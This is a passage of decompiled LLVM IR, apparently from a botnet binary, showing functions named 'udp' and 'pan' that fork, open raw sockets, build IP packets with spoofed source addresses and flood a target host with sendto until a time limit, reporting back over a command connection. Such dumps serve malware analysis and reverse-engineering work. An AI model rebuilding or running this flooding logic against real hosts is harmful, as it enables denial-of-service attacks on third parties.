  %v2_804e226 = inttoptr i32 %v1_804e226 to i32*
  store i32 134535871, i32* %v2_804e226, align 4
  %v0_804e22e = load i32, i32* @esp, align 4
  %v1_804e22e = add i32 %v0_804e22e, 4
  %v2_804e22e = inttoptr i32 %v1_804e22e to i32*
  store i32 0, i32* %v2_804e22e, align 4
  %v0_804e236 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e236 = load i32, i32* @esp, align 4
  %v2_804e236 = inttoptr i32 %v1_804e236 to i32*
  store i32 %v0_804e236, i32* %v2_804e236, align 4
  %v0_804e239 = call i32 @pthread_create()
  %v4_804e23e = add nuw nsw i32 %storemerge60, 1
  store i32 %v4_804e23e, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804e23e, %v2_804df0a
  br i1 %exitcond, label %dec_label_pc_804e241.dec_label_pc_804e24d_crit_edge, label %dec_label_pc_804e198

dec_label_pc_804e241.dec_label_pc_804e24d_crit_edge: ; preds = %dec_label_pc_804e198
  %v1_804e255.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e24d

dec_label_pc_804e24d:                             ; preds = %dec_label_pc_804e241.dec_label_pc_804e24d_crit_edge, %dec_label_pc_804e0df
  %v1_804e255 = phi i32 [ %v1_804e255.pre, %dec_label_pc_804e241.dec_label_pc_804e24d_crit_edge ], [ %v2_804e162, %dec_label_pc_804e0df ]
  %storemerge.lcssa = phi i32 [ %v2_804df0a, %dec_label_pc_804e241.dec_label_pc_804e24d_crit_edge ], [ 0, %dec_label_pc_804e0df ]
  store i32 %v1_804e135, i32* %eax.global-to-local, align 4
  %v2_804e253 = load i32, i32* %v1_804e138, align 4
  %v2_804e255 = add i32 %v1_804e255, 12
  %v3_804e255 = inttoptr i32 %v2_804e255 to i32*
  store i32 %v2_804e253, i32* %v3_804e255, align 4
  %v1_804e25c = load i32, i32* @esp, align 4
  %v2_804e25c = add i32 %v1_804e25c, 8
  %v3_804e25c = inttoptr i32 %v2_804e25c to i32*
  store i32 %arg2, i32* %v3_804e25c, align 4
  %v0_804e260 = load i32, i32* @esp, align 4
  %v1_804e260 = add i32 %v0_804e260, 4
  %v2_804e260 = inttoptr i32 %v1_804e260 to i32*
  store i32 ptrtoint ([31 x i8]* @global_var_806a564.133 to i32), i32* %v2_804e260, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804e26b = load i32, i32* @esp, align 4
  %v2_804e26b = inttoptr i32 %v1_804e26b to i32*
  store i32 %arg1, i32* %v2_804e26b, align 4
  %v2_804e26e = call i32 @Send(i32 %storemerge.lcssa, i32 128)
  store i32 %v1_804de01, i32* %eax.global-to-local, align 4
  %v2_804e280 = load i32, i32* %v1_804de04, align 4
  store i32 %v2_804e280, i32* %eax.global-to-local, align 4
  %v1_804e282 = load i32, i32* @esp, align 4
  %v2_804e282 = inttoptr i32 %v1_804e282 to i32*
  store i32 %v2_804e280, i32* %v2_804e282, align 4
  %v1_804e285 = call i32 @atol(i32 0)
  %v9_804e28a = mul i32 %v1_804e285, 20
  store i32 %v9_804e28a, i32* %eax.global-to-local, align 4
  %v7_804e291 = icmp sgt i32 %v9_804e28a, 0
  br i1 %v7_804e291, label %dec_label_pc_804e297, label %dec_label_pc_804e354

dec_label_pc_804e297:                             ; preds = %dec_label_pc_804e24d
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v1_804e2a6 = load i32, i32* @esp, align 4
  %v2_804e2a6 = inttoptr i32 %v1_804e2a6 to i32*
  store i32 50000, i32* %v2_804e2a6, align 4
  %v2_804e2a9 = call i32 @usleep(i64 0)
  %v0_804e2ae = load i64, i64* @global_var_807e2e0.88, align 8
  %sext = mul i64 %v0_804e2ae, 4294967296
  %v2_804e2b7 = sdiv i64 %sext, 4294967296
  %v4_804e2b7 = mul nsw i64 %v2_804e2b7, 20
  %v5_804e2b7 = trunc i64 %v4_804e2b7 to i32
  store i32 %v5_804e2b7, i32* %edx.global-to-local, align 4
  %tmp62 = icmp ugt i32 %v5_804e2b7, %v2_804df1d
  %v0_804e2e6 = load i32, i32* @global_var_807e1a8.89, align 8
  store i32 %v0_804e2e6, i32* %eax.global-to-local, align 4
  br i1 %tmp62, label %dec_label_pc_804e2c1, label %dec_label_pc_804e2e6

dec_label_pc_804e2c1:                             ; preds = %dec_label_pc_804e297
  %tmp51 = icmp slt i32 %v0_804e2e6, 1
  %tmp52 = icmp eq i1 %tmp51, false
  br i1 %tmp52, label %dec_label_pc_804e2d9, label %dec_label_pc_804e2ca

dec_label_pc_804e2ca:                             ; preds = %dec_label_pc_804e2c1
  %v0_804e2ca = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804e2cf = add i32 %v0_804e2ca, 100
  store i32 %v1_804e2cf, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2cf, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804e314

dec_label_pc_804e2d9:                             ; preds = %dec_label_pc_804e2c1
  %v1_804e2de = add i32 %v0_804e2e6, -1
  store i32 %v1_804e2de, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2de, i32* @global_var_807e1a8.89, align 8
  br label %dec_label_pc_804e314

dec_label_pc_804e2e6:                             ; preds = %dec_label_pc_804e297
  %v1_804e2eb = add i32 %v0_804e2e6, 1
  store i32 %v1_804e2eb, i32* @global_var_807e1a8.89, align 8
  %v0_804e2f1 = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804e2f1, i32* %eax.global-to-local, align 4
  %v1_804e2f6 = add i32 %v0_804e2f1, -25
  %v5_804e2f6 = icmp ult i32 %v0_804e2f1, 25
  %v9_804e2f6 = icmp eq i32 %v1_804e2f6, 0
  %v2_804e2f9 = or i1 %v5_804e2f6, %v9_804e2f6
  br i1 %v2_804e2f9, label %dec_label_pc_804e30a, label %dec_label_pc_804e2fb

dec_label_pc_804e2fb:                             ; preds = %dec_label_pc_804e2e6
  store i32 %v1_804e2f6, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2f6, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804e314

dec_label_pc_804e30a:                             ; preds = %dec_label_pc_804e2e6
  store i32 0, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804e314

dec_label_pc_804e314:                             ; preds = %dec_label_pc_804e2fb, %dec_label_pc_804e2d9, %dec_label_pc_804e2ca, %dec_label_pc_804e30a
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v5_804e335 = add i32 %v2_804de04, %v3_804ddf6
  br label %dec_label_pc_804e31e

dec_label_pc_804e31e:                             ; preds = %dec_label_pc_804e34f, %dec_label_pc_804e314
  %stack_var_-64.0 = phi i32 [ %tmp, %dec_label_pc_804e314 ], [ %v4_804e34f, %dec_label_pc_804e34f ]
  %v7_804e322 = icmp sgt i32 %stack_var_-64.0, 99
  br i1 %v7_804e322, label %dec_label_pc_804e324, label %dec_label_pc_804e34f

dec_label_pc_804e324:                             ; preds = %dec_label_pc_804e31e
  %v0_804e324 = load i32, i32* @esp, align 4
  %v1_804e324 = inttoptr i32 %v0_804e324 to i32*
  store i32 0, i32* %v1_804e324, align 4
  %v2_804e32b = call i32 @__GI_time(i32* null)
  store i32 %v2_804e32b, i32* %edx.global-to-local, align 4
  store i32 %v5_804e335, i32* %eax.global-to-local, align 4
  %v7_804e338 = icmp ult i32 %v2_804e32b, %v5_804e335
  br i1 %v7_804e338, label %dec_label_pc_804e34f, label %dec_label_pc_804e33c

dec_label_pc_804e33c:                             ; preds = %dec_label_pc_804e324
  %v0_804e33c = load i32, i32* @esp, align 4
  %v1_804e33c = inttoptr i32 %v0_804e33c to i32*
  store i32 0, i32* %v1_804e33c, align 4
  %v1_804e343 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804e343, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e34f

dec_label_pc_804e34f:                             ; preds = %dec_label_pc_804e33c, %dec_label_pc_804e324, %dec_label_pc_804e31e
  %stack_var_-64.1 = phi i32 [ %stack_var_-64.0, %dec_label_pc_804e31e ], [ 0, %dec_label_pc_804e324 ], [ 0, %dec_label_pc_804e33c ]
  %v4_804e34f = add i32 %stack_var_-64.1, 1
  br label %dec_label_pc_804e31e

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e24d
  %v0_804e354 = load i32, i32* @esp, align 4
  %v1_804e354 = inttoptr i32 %v0_804e354 to i32*
  store i32 0, i32* %v1_804e354, align 4
  %v1_804e35b = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804e35b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e360

dec_label_pc_804e360:                             ; preds = %dec_label_pc_804ddef, %entry, %dec_label_pc_804e354
  %v0_804e36d = phi i32 [ %v1_804de35, %dec_label_pc_804ddef ], [ %v2_804dd85, %entry ], [ %v1_804e35b, %dec_label_pc_804e354 ]
  ret i32 %v0_804e36d

; uselistorder directives
  uselistorder i32 %v1_804e2f6, { 1, 0, 2 }
  uselistorder i32 %v0_804e2e6, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804e28a, { 1, 0 }
  uselistorder i32 %v3_804e1ae, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e1a4, { 0, 2, 1 }
  uselistorder i32 %storemerge60, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804e177, { 1, 2, 3, 0 }
  uselistorder i32 %v2_804e114, { 0, 2, 1 }
  uselistorder i32 %v0_804e036, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e025, { 1, 0 }
  uselistorder i32 %v2_804e050, { 1, 0, 2, 3, 4, 8, 9, 7, 6, 5, 10 }
  uselistorder i32 %v2_804df0a, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v0_804defa, { 12, 10, 7, 6, 5, 4, 8, 1, 3, 2, 0, 9, 11 }
  uselistorder i32 %v4_804de3d, { 1, 0 }
  uselistorder i32 %v4_804ddc3, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 16, 14, 15, 68, 17, 18, 19, 22, 40, 20, 21, 23, 24, 25, 27, 28, 29, 30, 31, 26, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 67, 66 }
  uselistorder i32 50000, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12 }
  uselistorder i32 ()* @pthread_create, { 3, 2, 1, 0 }
  uselistorder i32 540, { 0, 10, 1, 2, 11, 3, 4, 12, 5, 6, 13, 7, 8, 14, 9 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_8069c83.83 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i64* @global_var_807e2e0.88, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_807e1a8.89, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14, 15, 17, 16, 18, 19, 20, 22, 21, 23, 24, 25, 27, 26, 28, 29, 31, 30, 32, 33 }
  uselistorder i32 %arg4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e360, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e314, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804ddef, { 1, 0 }
  uselistorder label %dec_label_pc_804ddc3, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-1596 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e36e = load i32, i32* @ebp, align 4
  store i32 %v0_804e36e, i32* %stack_var_-4, align 4
  %v4_804e36e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804e36e, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-1596, align 4
  %v2_804e385 = call i32 @__GI_time(i32* null)
  store i32 %arg2, i32* %stack_var_-1596, align 4
  %v1_804e393 = call i32 @mfork(i32 %arg2)
  %v1_804e398 = icmp eq i32 %v1_804e393, 0
  %v1_804e39a = icmp eq i1 %v1_804e398, false
  br i1 %v1_804e39a, label %dec_label_pc_804e61c, label %dec_label_pc_804e3a0

dec_label_pc_804e3a0:                             ; preds = %entry
  store i32 2, i32* %stack_var_-1596, align 4
  %v4_804e3b7 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804e3bf = icmp slt i32 %v4_804e3b7, 0
  %v1_804e3c3 = icmp eq i1 %v5_804e3bf, false
  br i1 %v1_804e3c3, label %dec_label_pc_804e3d1, label %dec_label_pc_804e3c5

dec_label_pc_804e3c5:                             ; preds = %dec_label_pc_804e3a0
  store i32 1, i32* %stack_var_-1596, align 4
  %v1_804e3cc = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e3d1

dec_label_pc_804e3d1:                             ; preds = %dec_label_pc_804e3a0, %dec_label_pc_804e3c5
  %v4_804e3d1 = add i32 %arg3, -2
  %v9_804e3d1 = sub i32 1, %arg3
  %v10_804e3d1 = and i32 %v9_804e3d1, %arg3
  %v11_804e3d1 = icmp slt i32 %v10_804e3d1, 0
  %v12_804e3d1 = icmp eq i32 %v4_804e3d1, 0
  %v13_804e3d1 = icmp slt i32 %v4_804e3d1, 0
  %v3_804e3d5 = icmp eq i1 %v13_804e3d1, %v11_804e3d1
  %v4_804e3d5 = icmp eq i1 %v12_804e3d1, false
  %v5_804e3d5 = and i1 %v4_804e3d5, %v3_804e3d5
  br i1 %v5_804e3d5, label %dec_label_pc_804e3fd, label %dec_label_pc_804e3d7

dec_label_pc_804e3d7:                             ; preds = %dec_label_pc_804e3d1
  store i32 %arg1, i32* %stack_var_-1596, align 4
  %v3_804e3ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_806a584.134 to i32))
  store i32 1, i32* %stack_var_-1596, align 4
  %v1_804e3f8 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e3fd

dec_label_pc_804e3fd:                             ; preds = %dec_label_pc_804e3d1, %dec_label_pc_804e3d7
  %v1_804e400 = add i32 %arg4, 4
  %v1_804e403 = inttoptr i32 %v1_804e400 to i32*
  %v2_804e403 = load i32, i32* %v1_804e403, align 4
  store i32 %arg2, i32* %stack_var_-1596, align 4
  %v3_804e40f = call i32 @host2ip(i32 %arg2, i32 %v2_804e403)
  %v1_804e41a = add i32 %arg4, 8
  %v1_804e41d = inttoptr i32 %v1_804e41a to i32*
  %v2_804e41d = load i32, i32* %v1_804e41d, align 4
  store i32 %v2_804e41d, i32* %stack_var_-1596, align 4
  %v1_804e422 = call i32 @atol(i32 %v2_804e41d)
  %v1_804e42d = add i32 %arg4, 12
  %v1_804e430 = inttoptr i32 %v1_804e42d to i32*
  %v2_804e430 = load i32, i32* %v1_804e430, align 4
  store i32 %v2_804e430, i32* %stack_var_-1596, align 4
  %v1_804e435 = call i32 @atol(i32 %v2_804e430)
  %v2_804e43d = ptrtoint i32* %stack_var_-1560 to i32
  %tmp33 = bitcast i32* %stack_var_-1540 to i16*
  %v15_804e458 = ptrtoint i32* %stack_var_-1532 to i32
  store i32 %v15_804e458, i32* %stack_var_-1596, align 4
  %v4_804e474 = bitcast i32* %stack_var_-1532 to i8*
  %v5_804e474 = call i32 @__GI_memset(i8* %v4_804e474, i32 10, i32 1472)
  store i32 %arg1, i32* %stack_var_-1596, align 4
  %v3_804e49a = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_806a5ab.135 to i32))
  %v3_804e4a9 = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_804e4a9, align 4
  %v1_804e4ba = or i32 %v2_804e43d, 1
  %v2_804e4ba = inttoptr i32 %v1_804e4ba to i8*
  store i8 0, i8* %v2_804e4ba, align 1
  %v1_804e4c1 = or i32 %v2_804e43d, 2
  %v2_804e4c1 = inttoptr i32 %v1_804e4c1 to i16*
  store i16 1500, i16* %v2_804e4c1, align 2
  %v1_804e4ca = add i32 %v2_804e43d, 6
  %v2_804e4ca = inttoptr i32 %v1_804e4ca to i16*
  store i16 0, i16* %v2_804e4ca, align 2
  %v1_804e4d3 = add i32 %v2_804e43d, 9
  %v2_804e4d3 = inttoptr i32 %v1_804e4d3 to i8*
  store i8 17, i8* %v2_804e4d3, align 1
  %v1_804e4da = add i32 %v2_804e43d, 8
  %v2_804e4da = inttoptr i32 %v1_804e4da to i8*
  store i8 64, i8* %v2_804e4da, align 4
  %v2_804e4e4 = add i32 %v2_804e43d, 16
  %v3_804e4e4 = inttoptr i32 %v2_804e4e4 to i32*
  store i32 %v3_804e40f, i32* %v3_804e4e4, align 4
  %v1_804e4ea = urem i32 %tmp9, 65536
  store i32 %v1_804e4ea, i32* %stack_var_-1596, align 4
  %v1_804e4f0 = trunc i32 %tmp9 to i16
  %v2_804e4f0 = call i32 @htons(i16 %v1_804e4f0)
  %v4_804e4f8 = ptrtoint i32* %stack_var_-1540 to i32
  %v1_804e4fb = trunc i32 %v2_804e4f0 to i16
  %v3_804e4fb = add i32 %v4_804e4f8, 4
  %v4_804e4fb = inttoptr i32 %v3_804e4fb to i16*
  store i16 %v1_804e4fb, i16* %v4_804e4fb, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v4_804e519 = icmp eq i32 %v1_804e422, 0
  %v3_804e544 = or i32 %v4_804e4f8, 2
  %v4_804e544 = inttoptr i32 %v3_804e544 to i16*
  %v3_804e559 = bitcast i32* %stack_var_-1560 to i16*
  %v3_804e564 = add i32 %v4_804e4f8, 6
  %v4_804e564 = inttoptr i32 %v3_804e564 to i16*
  %v2_804e572 = add i32 %v2_804e43d, 12
  %v3_804e572 = inttoptr i32 %v2_804e572 to i32*
  %v3_804e580 = add i32 %v2_804e43d, 4
  %v4_804e580 = inttoptr i32 %v3_804e580 to i16*
  %v3_804e5a0 = add i32 %v2_804e43d, 10
  %v4_804e5a0 = inttoptr i32 %v3_804e5a0 to i16*
  %v2_804e5af = ptrtoint i32* %stack_var_-60 to i32
  %v5_804e5fa = add i32 %v1_804e435, %v2_804e385
  %v1_804e522 = urem i32 %v1_804e422, 65536
  %v1_804e528 = trunc i32 %v1_804e422 to i16
  br label %dec_label_pc_804e50b

dec_label_pc_804e50b:                             ; preds = %dec_label_pc_804e614, %dec_label_pc_804e3fd
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804e3fd ], [ %v4_804e614, %dec_label_pc_804e614 ]
  %v0_804e50b = call i32 @random()
  %v1_804e516 = trunc i32 %v0_804e50b to i16
  store i16 %v1_804e516, i16* %tmp33, align 4
  br i1 %v4_804e519, label %dec_label_pc_804e539, label %dec_label_pc_804e51f

dec_label_pc_804e51f:                             ; preds = %dec_label_pc_804e50b
  store i32 %v1_804e522, i32* %stack_var_-1596, align 4
  %v2_804e528 = call i32 @htons(i16 %v1_804e528)
  br label %dec_label_pc_804e548

dec_label_pc_804e539:                             ; preds = %dec_label_pc_804e50b
  %v0_804e539 = call i32 @random()
  br label %dec_label_pc_804e548

dec_label_pc_804e548:                             ; preds = %dec_label_pc_804e51f, %dec_label_pc_804e539
  %storemerge4.in = phi i32 [ %v2_804e528, %dec_label_pc_804e51f ], [ %v0_804e539, %dec_label_pc_804e539 ]
  %storemerge = trunc i32 %storemerge4.in to i16
  store i16 %storemerge, i16* %v4_804e544, align 2
  store i32 %v2_804e43d, i32* %stack_var_-1596, align 4
  %v4_804e559 = call i32 @in_cksum(i16* %v3_804e559, i32 1500)
  %v1_804e564 = trunc i32 %v4_804e559 to i16
  store i16 %v1_804e564, i16* %v4_804e564, align 2
  %v0_804e568 = load i32, i32* %stack_var_-1596, align 4
  %v1_804e568 = call i32 @getspoof(i32 %v0_804e568)
  store i32 %v1_804e568, i32* %v3_804e572, align 4
  %v0_804e575 = call i32 @random()
  %v1_804e580 = trunc i32 %v0_804e575 to i16
  store i16 %v1_804e580, i16* %v4_804e580, align 4
  store i32 %v2_804e43d, i32* %stack_var_-1596, align 4
  %v4_804e595 = call i32 @in_cksum(i16* %v3_804e559, i32 1500)
  %v1_804e5a0 = trunc i32 %v4_804e595 to i16
  store i16 %v1_804e5a0, i16* %v4_804e5a0, align 2
  store i32 %v4_804e3b7, i32* %stack_var_-1596, align 4
  %v7_804e5de = call i32 @sendto(i32 %v4_804e3b7, i32 %v2_804e43d, i32 1500, i32 0, i32 %v2_804e5af, i32 16)
  %tmp = icmp ult i32 %stack_var_-40.0, 100
  br i1 %tmp, label %dec_label_pc_804e614, label %dec_label_pc_804e5e9

dec_label_pc_804e5e9:                             ; preds = %dec_label_pc_804e548
  store i32 0, i32* %stack_var_-1596, align 4
  %v2_804e5f0 = call i32 @__GI_time(i32* null)
  %v7_804e5fd = icmp ult i32 %v2_804e5f0, %v5_804e5fa
  br i1 %v7_804e5fd, label %dec_label_pc_804e614, label %dec_label_pc_804e601

dec_label_pc_804e601:                             ; preds = %dec_label_pc_804e5e9
  store i32 0, i32* %stack_var_-1596, align 4
  %v1_804e608 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804e614

dec_label_pc_804e614:                             ; preds = %dec_label_pc_804e601, %dec_label_pc_804e5e9, %dec_label_pc_804e548
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804e548 ], [ 0, %dec_label_pc_804e5e9 ], [ 0, %dec_label_pc_804e601 ]
  %v4_804e614 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_804e50b

dec_label_pc_804e61c:                             ; preds = %entry
  ret i32 %v1_804e393

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v2_804e43d, { 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %v1_804e422, { 1, 0, 2 }
  uselistorder i32 %v4_804e3d1, { 1, 0 }
  uselistorder i32 %v4_804e3b7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1596, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e548, { 1, 0 }
  uselistorder label %dec_label_pc_804e3fd, { 1, 0 }
  uselistorder label %dec_label_pc_804e3d1, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-108 = alloca i8, align 1
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v2_804e628 = ptrtoint i32* %stack_var_-256 to i32
  store i32 %v2_804e628, i32* %stack_var_-300, align 4
  %v3_804e643 = bitcast i32* %stack_var_-256 to i16*
  %v4_804e643 = call i32 @memcpy(i16* %v3_804e643, i32 ptrtoint (i32* @global_var_806a5e0.136 to i32), i32 80)
  store i32 0, i32* %stack_var_-300, align 4
  %v2_804e65d = call i32 @__GI_time(i32* null)
  store i32 %arg2, i32* %stack_var_-300, align 4
  %v1_804e66b = call i32 @mfork(i32 %arg2)
  %v1_804e670 = icmp eq i32 %v1_804e66b, 0
  %v1_804e672 = icmp eq i1 %v1_804e670, false
  br i1 %v1_804e672, label %dec_label_pc_804ea05, label %dec_label_pc_804e678

dec_label_pc_804e678:                             ; preds = %entry
  store i32 2, i32* %stack_var_-300, align 4
  %v3_804e68f = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804e697 = icmp slt i32 %v3_804e68f, 0
  %v1_804e69b = icmp eq i1 %v5_804e697, false
  br i1 %v1_804e69b, label %dec_label_pc_804e6a9, label %dec_label_pc_804e69d

dec_label_pc_804e69d:                             ; preds = %dec_label_pc_804e678
  store i32 1, i32* %stack_var_-300, align 4
  %v1_804e6a4 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e6a9

dec_label_pc_804e6a9:                             ; preds = %dec_label_pc_804e678, %dec_label_pc_804e69d
  %v4_804e6a9 = add i32 %arg3, -2
  %v9_804e6a9 = sub i32 1, %arg3
  %v10_804e6a9 = and i32 %v9_804e6a9, %arg3
  %v11_804e6a9 = icmp slt i32 %v10_804e6a9, 0
  %v12_804e6a9 = icmp eq i32 %v4_804e6a9, 0
  %v13_804e6a9 = icmp slt i32 %v4_804e6a9, 0
  %v3_804e6ad = icmp eq i1 %v13_804e6a9, %v11_804e6a9
  %v4_804e6ad = icmp eq i1 %v12_804e6a9, false
  %v5_804e6ad = and i1 %v4_804e6ad, %v3_804e6ad
  br i1 %v5_804e6ad, label %dec_label_pc_804e6f2.preheader, label %dec_label_pc_804e6af

dec_label_pc_804e6af:                             ; preds = %dec_label_pc_804e6a9
  store i32 %arg1, i32* %stack_var_-300, align 4
  %v2_804e6c4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_806a630.137 to i32))
  store i32 1, i32* %stack_var_-300, align 4
  %v1_804e6d0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e6f2.preheader

dec_label_pc_804e6f2.preheader:                   ; preds = %dec_label_pc_804e6a9, %dec_label_pc_804e6af
  br label %dec_label_pc_804e6de

dec_label_pc_804e6de:                             ; preds = %dec_label_pc_804e6f2.preheader, %dec_label_pc_804e6de
  %storemerge69 = phi i32 [ 0, %dec_label_pc_804e6f2.preheader ], [ %v4_804e6ef, %dec_label_pc_804e6de ]
  store i32 %storemerge69, i32* @edx, align 4
  %v0_804e6e4 = load i32, i32* @ebp, align 4
  %v2_804e6e4 = mul nuw nsw i32 %storemerge69, 4
  %v3_804e6e4 = add nuw nsw i32 %v2_804e6e4, -252
  %v4_804e6e4 = add i32 %v3_804e6e4, %v0_804e6e4
  %v5_804e6e4 = inttoptr i32 %v4_804e6e4 to i32*
  %v6_804e6e4 = load i32, i32* %v5_804e6e4, align 4
  %v1_804e6eb = trunc i32 %v6_804e6e4 to i8
  %v4_804e6eb = add nuw nsw i32 %storemerge69, -64
  %v5_804e6eb = add i32 %v4_804e6eb, %v0_804e6e4
  %v6_804e6eb = inttoptr i32 %v5_804e6eb to i8*
  store i8 %v1_804e6eb, i8* %v6_804e6eb, align 1
  %v4_804e6ef = add nuw nsw i32 %storemerge69, 1
  %exitcond = icmp eq i32 %v4_804e6ef, 20
  br i1 %exitcond, label %dec_label_pc_804e6f8, label %dec_label_pc_804e6de

dec_label_pc_804e6f8:                             ; preds = %dec_label_pc_804e6de
  %v1_804e6fb = add i32 %arg4, 4
  %v1_804e6fe = inttoptr i32 %v1_804e6fb to i32*
  %v2_804e6fe = load i32, i32* %v1_804e6fe, align 4
  store i32 %arg2, i32* %stack_var_-300, align 4
  %v2_804e70a = call i32 @host2ip(i32 %arg2, i32 %v2_804e6fe)
  %v1_804e715 = add i32 %arg4, 12
  %v1_804e718 = inttoptr i32 %v1_804e715 to i32*
  %v2_804e718 = load i32, i32* %v1_804e718, align 4
  store i32 %v2_804e718, i32* %stack_var_-300, align 4
  %v1_804e71d = call i32 @atol(i32 %v2_804e718)
  store i32 %arg1, i32* %stack_var_-300, align 4
  %v2_804e746 = call i32 @Send(i32 %arg1, i32 ptrtoint ([23 x i8]* @global_var_806a657.138 to i32))
  store i8 69, i8* %stack_var_-108, align 1
  %v1_804e7d3 = add i32 %arg4, 8
  %v1_804e7d6 = inttoptr i32 %v1_804e7d3 to i32*
  %v2_804e7d6 = load i32, i32* %v1_804e7d6, align 4
  store i32 %v2_804e7d6, i32* %stack_var_-300, align 4
  %v1_804e7db = call i32 @atol(i32 %v2_804e7d6)
  %v1_804e7e0 = urem i32 %v1_804e7db, 65536
  store i32 %v1_804e7e0, i32* %stack_var_-300, align 4
  %v1_804e7e6 = trunc i32 %v1_804e7db to i16
  %v2_804e7e6 = call i32 @htons(i16 %v1_804e7e6)
  %v1_804e7eb = urem i32 %v2_804e7e6, 65536
  store i32 0, i32* %stack_var_-300, align 4
  %v2_804e7f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e7f8, i32* @ebx, align 4
  %v0_804e7ff = load i32, i32* %stack_var_-300, align 4
  %v1_804e7ff = call i32 @__libc_getpid(i32 %v0_804e7ff)
  %v0_804e804 = load i32, i32* @ebx, align 4
  %v2_804e804 = add i32 %v0_804e804, %v1_804e7ff
  store i32 %v2_804e804, i32* %stack_var_-300, align 4
  %v1_804e80a = call i32 @srand(i32 %v2_804e804)
  %v2_804e898 = ptrtoint i8* %stack_var_-108 to i32
